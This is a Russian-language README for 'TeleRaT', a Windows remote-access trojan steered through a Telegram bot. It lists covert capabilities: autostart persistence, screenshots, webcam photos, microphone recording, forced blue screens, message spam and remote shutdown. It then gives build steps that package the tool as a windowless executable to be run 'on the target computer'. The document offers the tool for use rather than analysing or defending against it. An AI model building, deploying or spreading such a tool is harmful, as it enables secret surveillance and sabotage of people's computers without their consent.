# TeleRaT
Удаленный доступ через Telegram

Требования: Windows

Функционал:
  Управление через telegram бот 
  Один компьютер - один бот
  Автозагрузка
  
  Скриншот
  Фото с камеры
  Запись с микрофона
  BSoD (При запуске от администратора)
  Смена обоев рабочего стола
  Спам сообщениями
  Перезагрузка/Выйти из пользователя/Выключение
  Информация о системе

Как установить:
  Создать и активировать виртуальное окружение
     python -m venv venv
     .\venv\Scripts\activate 
  pip install -r requirements.txt
  pip install -U pyinstaller
  
  В файле TeleRAT.py укажите api token бота, ваш id, смените ссылку на обои рабочего стола в соответствующих переменных
  Соберите в .exe с помощью pyinstaller 
    pyinstaller --onefile --no-console TeleRAT.py

Запустите полученный файл (Будет лежать в папке dist) на целевом компьютере, в диалог с телеграм ботом придет уведомление, подтвердите выбор командой User {id компьютера}
  
